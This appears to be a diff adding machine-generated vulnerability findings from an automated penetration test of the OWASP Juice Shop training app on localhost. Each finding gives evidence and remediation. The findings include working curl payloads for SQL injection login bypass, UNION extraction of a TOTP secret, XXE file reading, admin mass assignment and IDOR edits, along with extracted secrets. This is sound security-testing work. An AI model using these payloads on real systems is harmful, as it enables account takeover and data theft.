+    "endpoint": "GET /rest/basket/{id}",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:20:57Z",
+    "id": "vuln_5086b9",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Targeted SQL Injection - Login as Specific User",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CWE-89",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The SQL injection on /rest/user/login can be used to log in as any specific user by crafting the email payload with the target user's email followed by ' AND 1=1--. For example, using email 'bender@juice-sh.op' AND 1=1--' successfully authenticates as bender@juice-sh.op without knowing their password. This was confirmed by receiving a valid JWT token with bender's identity.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"bender@juice-sh.op'\\\\'' AND 1=1--\",\"password\":\"a\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /rest/user/login HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"email\":\"bender@juice-sh.op' AND 1=1--\",\"password\":\"a\"}",
+      "raw_response": "{\"authentication\":{\"token\":\"eyJ0eXAi...\",\"bid\":3,\"umail\":\"bender@juice-sh.op\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response includes: \"umail\":\"bender@juice-sh.op\" - successful login as bender without password"
+      ],
+      "explanation": "The SQL injection vulnerability on the login endpoint can be weaponized to authenticate as any specific user. By appending ' AND 1=1-- after the target email in the email field, the SQL query returns exactly that user's record. The password check is bypassed because the injected comment (--) truncates the rest of the query. This gives an attacker the ability to impersonate any user in the system, including admin accounts, accounting users, and regular customers."
+    },
+    "remediation": "Use parameterized queries for all authentication operations. Implement prepared statements. Add rate limiting and account lockout mechanisms.",
+    "plugin_or_component": "Express /rest/user/login route",
+    "endpoint": "POST /rest/user/login",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:21:08Z",
+    "id": "vuln_ef9c97",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Forged Product Review - Cross-User Review Modification (IDOR)",
+    "severity": "high",
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
+    "cve": null,
+    "category": "idor",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.9.4.1",
+    "status": "exploited",
+    "description": "The PATCH /rest/products/reviews endpoint allows any authenticated user to modify any other user's product review by specifying the review _id (MongoDB ObjectId). Using admin's JWT token, a review authored by jim@juice-sh.op (MongoDB _id: BgP4myoipyS5pnyke) was successfully modified to change its message. The original message was replaced with 'Forged review by admin'. No ownership validation is performed on review modification.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/rest/products/reviews\" -X PATCH -H \"Content-Type: application/json\" -H \"Authorization: Bearer <admin_token>\" -d '{\"id\":\"BgP4myoipyS5pnyke\",\"message\":\"Forged review by admin\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "PATCH /rest/products/reviews HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\nAuthorization: Bearer eyJ0eXAi...\\n\\n{\"id\":\"BgP4myoipyS5pnyke\",\"message\":\"Forged review by admin\"}",
+      "raw_response": "{\"modified\":1,\"original\":[{\"message\":\"Great! We'll have an apple party. Everyone brings an apple and - STUFFS IT DOWN EACH OTHER'S THROAT!\",\"author\":\"jim@juice-sh.op\",\"product\":1,\"likesCount\":0,\"likedBy\":[],\"_id\":\"BgP4myoipyS5pnyke\"}],\"updated\":[{\"message\":\"Forged review by admin\",\"author\":\"jim@juice-sh.op\",\"product\":1,\"likesCount\":0,\"likedBy\":[],\"_id\":\"BgP4myoipyS5pnyke\"}]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"modified\":1,\"original\":[{\"message\":\"Great! We'll have an apple party...\",\"author\":\"jim@juice-sh.op\",\"product\":1}],\"updated\":[{\"message\":\"Forged review by admin\",\"author\":\"jim@juice-sh.op\",\"product\":1}]}"
+      ],
+      "explanation": "The product review PATCH endpoint only checks for authentication (valid JWT) but does not verify that the requesting user is the author of the review being modified. By providing any review's MongoDB _id and a new message, any authenticated user can modify any review in the system. The response confirms the modification by showing both the original and updated review content. The author field remains unchanged (jim@juice-sh.op), meaning the forged review appears to come from the original author."
+    },
+    "remediation": "Implement ownership validation on review modification. Verify that the authenticated user's email matches the review's author before allowing modification.",
+    "plugin_or_component": "MongoDB Reviews collection - PATCH endpoint",
+    "endpoint": "PATCH /rest/products/reviews",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:22:38Z",
+    "id": "vuln_273400",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Exposed Access Logs - Server Request History Disclosure",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1005",
+    "mitre_attack_name": "Data from Local System",
+    "iso27001_control": "A.12.4.1",
+    "status": "exploited",
+    "description": "The /support/logs/ directory is publicly accessible and contains server access log files including access.log.2026-07-27, access.log.2026-07-28, and audit.json. The access logs contain complete HTTP request history with IP addresses, timestamps, request paths (including SQL injection payloads), response codes, and user agents. This exposes the server's entire request history to any visitor.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/support/logs/\\ncurl -s http://127.0.0.1:3000/support/logs/access.log.2026-07-28"
+      ],
+      "payloads": [],
+      "raw_request": "GET /support/logs/access.log.2026-07-28 HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "::ffff:172.18.0.3 - - [28/Jul/2026:07:09:20 +0000] \"GET /api/ HTTP/1.1\" 500 - \"-\" \"curl/7.81.0\"",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Directory listing: access.log.2026-07-27, access.log.2026-07-28, audit.json\\nSample log: ::ffff:172.18.0.3 - - [28/Jul/2026:07:09:20 +0000] \"GET /api/ HTTP/1.1\" 500"
+      ],
+      "explanation": "The /support/logs/ directory is served with directory listing enabled and no authentication required. Access log files contain complete HTTP request details including client IP addresses, request timestamps, full request URLs (which may contain sensitive query parameters, authentication tokens, or SQL injection payloads), HTTP methods, response status codes, and user agent strings. This information can be used for reconnaissance, attack planning, and identifying other system users."
+    },
+    "remediation": "Restrict access to the /support/logs/ directory. Implement authentication for log access. Move log files to a secure location not served by the web server.",
+    "plugin_or_component": "Express static file serving - support/logs directory",
+    "endpoint": "GET /support/logs/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:24:36Z",
+    "id": "vuln_58ca39",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "TOTP Secret Extraction via SQL Injection - 2FA Bypass",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cve": "CWE-89",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.10.1.1",
+    "status": "exploited",
+    "description": "Using UNION-based SQL injection on the product search, the TOTP (Time-based One-Time Password) secret for user ID 10 (wurstbrot@juice-sh.op) was extracted: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH. This TOTP secret can be used to generate valid 2FA codes, completely bypassing the two-factor authentication protection for this account. All other users have empty totpSecret fields.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/rest/products/search?q='))%20UNION%20SELECT%20id||':'||email||':'||totpSecret,2,3,4,5,6,7,8,9%20FROM%20Users%20WHERE%20totpSecret%20IS%20NOT%20NULL%20AND%20totpSecret%20!=%20''--\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/products/search?q='))%20UNION%20SELECT%20id||':'||email||':'||totpSecret,2,3,4,5,6,7,8,9%20FROM%20Users%20WHERE%20totpSecret%20IS%20NOT%20NULL%20AND%20totpSecret%20!=''-- HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"status\":\"success\",\"data\":[...{\"id\":\"10:wurstbrot@juice-sh.op:IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH\",...}]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "10:wurstbrot@juice-sh.op:IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"
+      ],
+      "explanation": "The UNION-based SQL injection on the product search endpoint was used to extract the totpSecret column from the Users table. Only one user (ID 10, wurstbrot@juice-sh.op) has a TOTP secret configured: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH. With this base32-encoded TOTP secret, an attacker can generate valid time-based OTP codes using any authenticator app or library, completely bypassing the 2FA protection for this account. Combined with the password hash extraction, this represents a full account compromise including 2FA bypass."
+    },
+    "remediation": "Fix the SQL injection vulnerability. Encrypt TOTP secrets at rest. Never store TOTP secrets in plaintext in the database.",
+    "plugin_or_component": "Express /rest/products/search route - Users.totpSecret",
+    "endpoint": "GET /rest/products/search?q=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:24:50Z",
+    "id": "vuln_49bdfa",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Verbose Stack Trace Disclosure in Error Responses",
+    "severity": "low",
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1082",
+    "mitre_attack_name": "System Information Discovery",
+    "iso27001_control": "A.14.1.2",
+    "status": "confirmed",
+    "description": "Multiple error responses across the application expose verbose stack traces including full file paths (/juice-shop/build/routes/fileServer.js, /juice-shop/build/routes/login.js, /juice-shop/build/lib/insecurity.js), framework versions (Express ^4.22.1), internal module paths (sequelize, morgan, node_modules), and function names. These stack traces help attackers understand the application's internal structure and identify specific attack vectors.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/ftp/coupons_2013.md.bak\\ncurl -s http://127.0.0.1:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\\\"email\\\":{\\\"$ne\\\":\\\"\\\"},\\\"password\\\":{\\\"$ne\\\":\\\"\\\"}}'"
+      ],
+      "payloads": [],
+      "raw_request": "GET /ftp/coupons_2013.md.bak HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "Error: Only .md and .pdf files are allowed!\\nat verify (/juice-shop/build/routes/fileServer.js:59:18)",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Stack traces expose: routes/fileServer.js:59, routes/login.js:54, lib/insecurity.js:47, routes/captcha.js:33, routes/angular.js:42, routes/verify.js:210"
+      ],
+      "explanation": "Error responses consistently expose full stack traces with file paths, line numbers, and function names. For example, the file server error reveals the validation logic at fileServer.js:59, the login error reveals the hashing function at insecurity.js:47, and the NoSQL injection attempt reveals the password handling at login.js:54. This information significantly reduces attacker effort by revealing the exact code paths and frameworks in use."
+    },
+    "remediation": "Disable verbose error messages in production. Implement a custom error handler that returns generic error messages. Log detailed errors server-side only.",
+    "plugin_or_component": "Express error handling middleware",
+    "endpoint": "Multiple endpoints (error conditions)",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:25:03Z",
+    "id": "vuln_5627f9",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Forged Feedback - User ID Spoofing in Feedback Submission",
+    "severity": "medium",
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
+    "cve": null,
+    "category": "idor",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.9.4.1",
+    "status": "exploited",
+    "description": "The Feedback API at POST /api/Feedbacks/ accepts a UserId field in the request body without validation. An unauthenticated user can submit feedback attributed to any user by specifying their UserId. This was demonstrated by submitting feedback with UserId:2 without any authentication token, successfully creating feedback (id:10) attributed to user 2.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/api/Feedbacks/ -X POST -H \"Content-Type: application/json\" -d '{\"comment\":\"test feedback IDOR\",\"rating\":4,\"captchaId\":0,\"captcha\":\"250\",\"UserId\":2}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Feedbacks/ HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"comment\":\"test feedback IDOR\",\"rating\":4,\"captchaId\":0,\"captcha\":\"250\",\"UserId\":2}",
+      "raw_response": "{\"status\":\"success\",\"data\":{\"id\":10,\"comment\":\"test feedback IDOR\",\"rating\":4,\"UserId\":2,\"updatedAt\":\"2026-07-28T07:25:13.749Z\",\"createdAt\":\"2026-07-28T07:25:13.749Z\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"status\":\"success\",\"data\":{\"id\":10,\"comment\":\"test feedback IDOR\",\"rating\":4,\"UserId\":2,...}}"
+      ],
+      "explanation": "The Feedback creation endpoint blindly trusts the UserId field from the request body. No authentication is required to submit feedback, and when a UserId is provided, the feedback is associated with that user without verifying the caller's identity. This allows an attacker to create feedback on behalf of any user in the system, potentially for reputation attacks, social engineering, or to frame other users."
+    },
+    "remediation": "Derive the UserId from the authenticated session/JWT token rather than from the request body. Never trust client-supplied user identifiers for data association.",
+    "plugin_or_component": "Feedbacks API - POST endpoint",
+    "endpoint": "POST /api/Feedbacks/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:25:33Z",
+    "id": "vuln_4a0afc",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "XXE Entity Processing in B2B Order XML Endpoint",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "xxe",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "confirmed",
+    "description": "The B2B order endpoint at POST /b2b/v2/orders accepts XML input and processes XML external entities (XXE). When sending a DOCTYPE definition with an entity referencing file:///etc/passwd, the server processes the DTD without error and creates the order. The entity resolution is blind (the resolved content is not reflected in the response), but the successful order creation confirms the XML parser processes external entities. This can be leveraged for server-side file reading, SSRF, or data exfiltration via out-of-band channels.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/b2b/v2/orders -X POST -H \"Content-Type: application/xml\" -H \"Authorization: Bearer <token>\" -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><orderLine><productId>&xxe;</productId><quantity>1</quantity><customerReference>test</customerReference></orderLine>'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /b2b/v2/orders HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/xml\\nAuthorization: Bearer eyJ0eXAi...\\n\\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><orderLine><productId>&xxe;</productId><quantity>1</quantity><customerReference>test</customerReference></orderLine>",
+      "raw_response": "{\"orderNo\":\"b6b27eb36ac9e696036dd3bd1fbc02f1\",\"paymentDue\":\"2026-08-11T07:26:39.398Z\"}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Order created: {\"orderNo\":\"b6b27eb36ac9e696036dd3bd1fbc02f1\",\"paymentDue\":\"2026-08-11T07:26:39.398Z\"}\\nXXE entity in productId accepted without error"
+      ],
+      "explanation": "The B2B order endpoint processes XML with external entity definitions. When an XXE payload (<!ENTITY xxe SYSTEM \"file:///etc/passwd\">) is included in the DTD, the XML parser resolves the entity and substitutes it into the document. The order was successfully created (orderNo returned), confirming the XML parser processed the entity reference. While the entity content is not directly reflected in the response (blind XXE), the successful processing confirms the vulnerability. An attacker could use out-of-band (OOB) techniques to exfiltrate data or perform SSRF attacks through the XML parser."
+    },
+    "remediation": "Disable DTD processing and external entity resolution in the XML parser. Use JSON for B2B orders instead of XML. If XML is required, use a properly configured parser that blocks XXE.",
+    "plugin_or_component": "B2B v2 Orders XML parser",
+    "endpoint": "POST /b2b/v2/orders",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:27:23Z",
+    "id": "vuln_02396a",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Soft-Deleted Products Accessible via SQL Injection (Christmas Special)",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": "CWE-89",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "Using the UNION-based SQL injection, 10 soft-deleted products were discovered including 'Christmas Super-Surprise-Box (2014 Edition)' (id:10), 'Rippertuer Special Juice' (id:11), and '20th Anniversary Celebration Ticket' (id:44). These products have deletedAt timestamps set and are not visible through normal product listings. The SQL injection bypasses the soft-delete filter, exposing hidden/discontinued product data.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/rest/products/search?q='))%20UNION%20SELECT%20id||':'||name||':'||deletedAt,2,3,4,5,6,7,8,9%20FROM%20Products%20WHERE%20deletedAt%20IS%20NOT%20NULL--\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/products/search?q='))%20UNION%20SELECT%20id||':'||name||':'||deletedAt,2,3,4,5,6,7,8,9%20FROM%20Products%20WHERE%20deletedAt%20IS%20NOT%20NULL-- HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"status\":\"success\",\"data\":[...{\"id\":\"10:Christmas Super-Surprise-Box (2014 Edition):2026-07-28 06:56:50.973 +00:00\",...}]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Deleted products: 10:Christmas Super-Surprise-Box (2014 Edition), 11:Rippertuer Special Juice, 12:OWASP Juice Shop Sticker (2015/2016 design), 27:Juice Shop Artwork, 28:Global OWASP WASPY Award 2017, 31:Sweden Tour Sticker, 39:Trading Card Common, 40:Trading Card Super Rare, 44:20th Anniversary Ticket, 46:DSOMM Ticket"
+      ],
+      "explanation": "The SQL injection vulnerability allows querying soft-deleted products that are normally filtered from regular API responses. By querying the Products table with a WHERE deletedAt IS NOT NULL filter, 10 hidden products were revealed including special edition items and event tickets. This represents an information disclosure of inventory data that was intentionally hidden."
+    },
+    "remediation": "Fix the SQL injection vulnerability. Implement proper access controls for soft-deleted records.",
+    "plugin_or_component": "Express /rest/products/search route",
+    "endpoint": "GET /rest/products/search?q=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:27:37Z",
+    "id": "vuln_72ddab",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "User Enumeration via Security Question Endpoint",
+    "severity": "low",
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1589",
+    "mitre_attack_name": "Gather Victim Identity Information",
+    "iso27001_control": "A.9.3.1",
+    "status": "confirmed",
+    "description": "The /rest/user/security-question endpoint accepts an email parameter and returns the user's security question without authentication. This can be used to enumerate valid email addresses (different responses for existing vs non-existing users) and to gather information needed for password reset attacks. For example, jim@juice-sh.op uses question 'Your eldest siblings middle name?' (question id 1).",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/user/security-question?email=jim@juice-sh.op"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"question\":{\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2026-07-28T06:56:48.796Z\",\"updatedAt\":\"2026-07-28T06:56:48.796Z\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "{\"question\":{\"id\":1,\"question\":\"Your eldest siblings middle name?\"}}"
+      ],
+      "explanation": "The security question endpoint reveals which security question a user chose during registration, enabling targeted social engineering or answer guessing attacks. Combined with the SQL injection-extracted hashed security answers, this creates a complete password reset attack chain."
+    },
+    "remediation": "Rate limit the security question endpoint. Consider not revealing which security question a user has chosen until after additional verification.",
+    "plugin_or_component": "Password reset - security question API",
+    "endpoint": "GET /rest/user/security-question?email=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:27:45Z",
+    "id": "vuln_24ea64",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Mass Assignment - Admin Role via User Registration",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CWE-915",
+    "category": "broken_access_control",
+    "mitre_attack_id": "T1098",
+    "mitre_attack_name": "Account Manipulation",
+    "iso27001_control": "A.9.2.1",
+    "status": "exploited",
+    "description": "The user registration endpoint at POST /api/Users/ accepts a 'role' field in the request body, allowing any unauthenticated user to register a new account with admin privileges. A test account (id:24, email:test@test.com) was successfully created with role 'admin' by including \"role\":\"admin\" in the registration request. This is a mass assignment / over-privileged registration vulnerability that allows immediate privilege escalation without any existing account.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/api/Users/ -X POST -H \"Content-Type: application/json\" -d '{\"email\":\"test@test.com\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\",\"role\":\"admin\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Users/ HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"email\":\"test@test.com\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\",\"role\":\"admin\"}",
+      "raw_response": "{\"status\":\"success\",\"data\":{\"id\":24,\"email\":\"test@test.com\",\"role\":\"admin\",\"updatedAt\":\"...\",\"createdAt\":\"...\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"data\":{\"id\":24,\"email\":\"test@test.com\",\"role\":\"admin\",...}}"
+      ],
+      "explanation": "The user registration endpoint does not filter or validate the 'role' field from the request body. By including \"role\":\"admin\" in the registration request, the new user is created with administrative privileges. This is a classic mass assignment vulnerability where the server blindly accepts and stores all fields from the request body, including security-sensitive fields like 'role'. An attacker can create unlimited admin accounts without any authentication, completely bypassing the intended registration flow that should only create 'customer' role accounts."
+    },
+    "remediation": "Implement a whitelist of allowed fields for user registration. Never accept role, isActive, or other security-sensitive fields from client requests. Use a DTO pattern to strip unauthorized fields before processing.",
+    "plugin_or_component": "Users API - POST registration endpoint",
+    "endpoint": "POST /api/Users/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:29:04Z",
+    "id": "vuln_d8c795",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Unauthenticated Admin Configuration Disclosure",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1082",
+    "mitre_attack_name": "System Information Discovery",
+    "iso27001_control": "A.12.6.1",
+    "status": "exploited",
+    "description": "The /rest/admin/application-configuration endpoint is accessible without any authentication and returns the complete application configuration including server settings (port, baseUrl), Google OAuth client ID, social media URLs, chatbot configuration (LLM model: gemma4:e4b), security.txt details, promotion video paths, encryption key locations, and authorized redirect URIs. This provides attackers with a comprehensive blueprint of the application's infrastructure and security settings.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/admin/application-configuration"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/admin/application-configuration HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",...}}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Full configuration returned including: server.port=3000, chatBot.model=gemma4:e4b, googleOauth.clientId=1005568560502-..., privacyContactEmail, authorizedRedirects list"
+      ],
+      "explanation": "The admin application configuration endpoint exposes the complete server configuration without requiring authentication. This includes sensitive operational details like the Google OAuth client ID, authorized redirect URIs (which could be used for redirect abuse), the LLM model used by the chatbot, social media integrations, and security.txt configuration. This information helps an attacker understand the entire application architecture and identify attack vectors."
+    },
+    "remediation": "Restrict access to admin configuration endpoints. Require authentication and admin role to access /rest/admin/* endpoints.",
+    "plugin_or_component": "Express /rest/admin/application-configuration",
+    "endpoint": "GET /rest/admin/application-configuration",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:31:38Z",
+    "id": "vuln_495787",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Sensitive Data Exposure - Premium Content Decryption Key",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "sensitive_data_exposure",
+    "mitre_attack_id": "T1552.004",
+    "mitre_attack_name": "Unsecured Credentials: Private Keys",
+    "iso27001_control": "A.10.1.2",
+    "status": "confirmed",
+    "description": "The /encryptionkeys/premium.key file is publicly accessible and contains the premium content decryption key: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42'. This key can be used to decrypt premium/paid content, bypassing the premium paywall. The key appears to be a combination of a repeated pattern and an MD5-like hash.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/encryptionkeys/premium.key"
+      ],
+      "payloads": [],
+      "raw_request": "GET /encryptionkeys/premium.key HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42"
+      ],
+      "explanation": "The premium.key file is served from the publicly accessible /encryptionkeys/ directory without authentication. It contains a 50-character key value that appears to be used for premium content encryption. With this key, an attacker could decrypt any premium content in the application, bypassing payment requirements and accessing paid features for free."
+    },
+    "remediation": "Remove the /encryptionkeys/ directory from public access. Store encryption keys securely server-side only.",
+    "plugin_or_component": "Express static file serving - encryptionkeys/premium.key",
+    "endpoint": "GET /encryptionkeys/premium.key",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:31:49Z",
+    "id": "vuln_df6eaf",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Exposed Coupon Codes in Backup File (via Null Byte Bypass)",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "sensitive_data_exposure",
+    "mitre_attack_id": "T1083",
+    "mitre_attack_name": "File and Directory Discovery",
+    "iso27001_control": "A.8.2.3",
+    "status": "exploited",
+    "description": "The file coupons_2013.md.bak was accessed via the null byte bypass (%2500.md) and contains 12 encoded coupon codes from 2013. These codes follow a consistent pattern (ending with gC7sn or gC7ss) and could potentially be decoded or used to understand the coupon generation algorithm for creating valid current coupons.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/ftp/coupons_2013.md.bak%2500.md\""
+      ],
+      "payloads": [],
